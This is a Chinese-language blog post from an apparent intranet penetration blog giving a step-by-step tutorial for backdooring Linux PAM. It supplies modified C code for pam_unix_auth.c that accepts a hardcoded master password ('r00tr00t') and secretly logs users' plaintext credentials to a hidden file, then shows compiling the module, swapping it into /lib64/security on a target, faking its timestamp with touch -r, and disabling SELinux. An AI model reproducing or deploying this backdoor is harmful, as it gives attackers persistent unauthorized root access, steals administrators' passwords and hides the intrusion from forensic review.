<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="内网渗透"><title>内网技巧-linuxPAM · 9821-zed</title><meta name="description" content="PAM 后门PAM是一种认证模块，PAM可以作为Linux登录验证和各类基础服务的认证，简单来说就是一种用于Linux系统上的用户身份验证的机制。进行认证时首先确定是什么服务，然后加载相应的PAM的配置文件(位于/etc/pam.d)，最后调用认证文件(位于/lib/security)进行安全认证简"><meta name="keywords"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><script src="/js/jquery.js"></script><meta name="generator" content="Hexo 4.2.1"></head><body><div class="sidebar animated fadeInDown"><div class="logo-title"><div class="title"><img src="/images/logo@2x.png" style="width:127px;"><h3 title=""><a href="/">9821-zed</a></h3><div class="description"><p>生活只会欺负穷人，爱情也是</p></div></div></div><ul class="social-links"></ul><div class="footer"><div class="p"> <span>© 2018 - 2020 </span><i class="fa fa-star"></i><span> 内网渗透</span></div><div class="by_farbox"><span>Powered by </span><a href="https://hexo.io/zh-cn/" target="_blank">Hexo </a><span> & </span><a href="https://github.com/mrcore/hexo-theme-Anatole-Core" target="_blank">Anatole-Core  </a></div><div class="beian"><a href="http://www.beian.miit.gov.cn/" target="_blank">活着比什么都好</a><span style="height:10px;margin-left: 10px;">|</span><img src="https://qn.jixian.io/gongan.png" style="height:10px;margin-left: 10px;position: relative;top: 1px;"><span style="margin-left: 2px;">粤公网安备 44030402003967号</span></div></div></div><div class="main"><div class="page-top animated fadeInDown"><div class="nav"><li><a href="/">首页</a></li><li><a href="/archives">归档</a></li><li><a href="/tags">标签</a></li><li><a href="/about">关于</a></li><li><a href="/guestbook">留言</a></li></div><div class="information"><div class="back_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li></div></div></div><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>内网技巧-linuxPAM</a></h3></div><div class="post-content"><h1 id="PAM-后门"><a href="#PAM-后门" class="headerlink" title="PAM 后门"></a>PAM 后门</h1><p>PAM是一种认证模块，PAM可以作为Linux登录验证和各类基础服务的认证，简单来说就是一种用于Linux系统上的用户身份验证的机制。进行认证时首先确定是什么服务，然后加载相应的PAM的配置文件(位于/etc/pam.d)，最后调用认证文件(位于/lib/security)进行安全认证<br>简单的理解，PAM中的模块可以实现对Linux登录认证。</p>
<p>查看pam版本：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">getconf LONG_BIT</span><br><span class="line">cat /etc/redhat-release</span><br><span class="line">rpm -qa | grep pam</span><br><span class="line">apt-get list --installed | grep pam</span><br></pre></td></tr></table></figure>
<p>查看系统版本</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/issue</span><br><span class="line">cat /etc/*-release</span><br><span class="line">cat /etc/lsb-release</span><br><span class="line">cat /etc/redhat-release</span><br></pre></td></tr></table></figure>
<p>PAM包下载地址：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.linux-pam.org/library/</span><br></pre></td></tr></table></figure>
<p>Github上有自动安装bash脚本</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/zephrax/linux-pam-backdoor</span><br></pre></td></tr></table></figure>
<p>真实环境中，需要确定目标的系统版本以及PAM版本，然后本地搭建同样环境，编译PAM_UNIX.so，随后复制到目标中替换目标上的相同文件即可。</p>
<h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p>Linux centos 7<br>PAM 1.1.8版本<br><img src="https://img-blog.csdnimg.cn/20201204150233530.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020120415030625.png" alt="在这里插入图片描述"></p>
<hr>
<p>首先下载PAM包：</p>
<blockquote>
<p><a href="http://www.linux-pam.org/library/Linux-PAM-1.1.8.tar.gz" target="_blank" rel="noopener">http://www.linux-pam.org/library/Linux-PAM-1.1.8.tar.gz</a></p>
</blockquote>
<p>随后解压，需要修改<code>/Linux-PAM-1.1.8/modules/pam_unix/pam_unix_auth.c</code>中的判断逻辑，实现记录登录密码以及万能密码登录<br><img src="https://img-blog.csdnimg.cn/20201204151043742.png" alt="在这里插入图片描述"><br>找到如下的代码行<br><img src="https://img-blog.csdnimg.cn/20201204151217135.png" alt="在这里插入图片描述"></p>
<p>替换<code>retval = _unix_verify_password(pamh, name, p, ctrl);</code>这一行<br><img src="https://img-blog.csdnimg.cn/20201204151320926.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5MTAxMDQ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *pass=<span class="string">"r00tr00t"</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *<span class="built_in">log</span>=<span class="string">"/usr/share/vim/.null"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strncmp</span>(pass,p,<span class="number">8</span>) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">        retval = PAM_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">        retval = _unix_verify_password(pamh, name, p, ctrl);</span><br><span class="line">        <span class="keyword">if</span>(retval == PAM_SUCCESS)</span><br><span class="line">        &#123;</span><br><span class="line">                FILE *fp = fopen(<span class="built_in">log</span>,<span class="string">"a+"</span>);</span><br><span class="line">                <span class="keyword">if</span>(fp!=<span class="literal">NULL</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="built_in">fprintf</span>(fp,<span class="string">"%s"</span>,name);</span><br><span class="line">                        <span class="built_in">fprintf</span>(fp,<span class="string">":"</span>);</span><br><span class="line">                        <span class="built_in">fprintf</span>(fp,<span class="string">"%s"</span>,p);</span><br><span class="line">                        <span class="built_in">fprintf</span>(fp,<span class="string">"\n"</span>);</span><br><span class="line">                        fclose(fp);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>随后保存退出<br>然后<code>yum install gcc flex-devel</code>,刚装的系统一般没有这些软件。需要自行安装，未装flex 的话64位系统编译可能会遇到yywrap()函数未定义错误<br>随后执行编译<code>./configre &amp;&amp; make</code><br><img src="https://img-blog.csdnimg.cn/20201204151640659.png" alt="在这里插入图片描述"><br>完成编译后，编译好的文件在<code>Linux-PAM-1.1.8/modules/pam_unix/.libs/pam_unix.so</code></p>
<p><img src="https://img-blog.csdnimg.cn/20201204152540706.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5MTAxMDQ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>32位的系统的认证文件 在<code>/lib/security</code><br>64位为 <code>/lib64/security</code></p>
<p>随后先备份原本的pam文件，再把当前文件移动过去，最后别忘把时间修改一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp -af /lib64/security/pam_unix.so /opt/ </span><br><span class="line">cp -af pam_unix.so /lib64/security/</span><br><span class="line">touch -r /lib64/security/pam_userdb.so /lib64/security/pam_unix.so</span><br></pre></td></tr></table></figure>
<p>唯一的点需要关闭SElinux</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setenforce 0</span><br></pre></td></tr></table></figure>
<p>SSH测试，键入我们预先的万能密码 r00tr00t<br><img src="https://img-blog.csdnimg.cn/20201204153042286.png" alt="在这里插入图片描述"><br>用原本的root账户密码也能登录，并且当他管理员登录上来之后，键入的密码会被记录到我们设置的文本中<br><img src="https://img-blog.csdnimg.cn/20201204153200181.png" alt="在这里插入图片描述"></p>
</div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2020-12-07</span><i class="fa fa-tag"></i><a class="tag" href="/tags/技巧/" title="技巧">技巧 </a><span class="leancloud_visitors"></span></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="" onclick="javascript:join_favorite()" ref="sidebar"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" href="http://twitter.com/home?status=,http://yoursite.com/2020/12/07/PAM/,9821-zed,内网技巧-linuxPAM,;" target="_blank" rel="noopener"></a></div></div><div class="pagination"><ul class="clearfix"><li class="next pagbuttons"><a class="btn" role="navigation" href="/2020/11/25/%E5%86%85%E7%BD%91%E6%8A%80%E5%B7%A7-RDP%E5%8A%AB%E6%8C%81%E5%8F%8A%E5%88%A9%E7%94%A8hash%E7%99%BB%E5%BD%95/" title="内网技巧-RDP劫持及利用hash登录">下一篇</a></li></ul></div><script src="/js/visitors.js"></script><a id="comments"></a><div id="vcomments" style="margin:0 30px;"></div><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="//cdn.jsdelivr.net/gh/xcss/valine@latest/dist/Valine.min.js"></script><script>var valine = new Valine({
  el:'#vcomments',
  notify:true || false, 
  verify:false|| false, 
  app_id:'rsRSoR5fW0Fh2Q7CvgJsm1v2-gzGzoHsz',
  app_key:'3srXHzWwmq9S19ucPADetjyI',
  placeholder:'你知道我在等你吗！',
  path: window.location.pathname,
  serverURLs: '',
  visitor:true,
  recordIP:true,
  avatar:'mm'
})</script></div></div></div></div><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script><script src="/js/add-bookmark.js"></script><script src="/js/baidu-tongji.js"></script></body></html>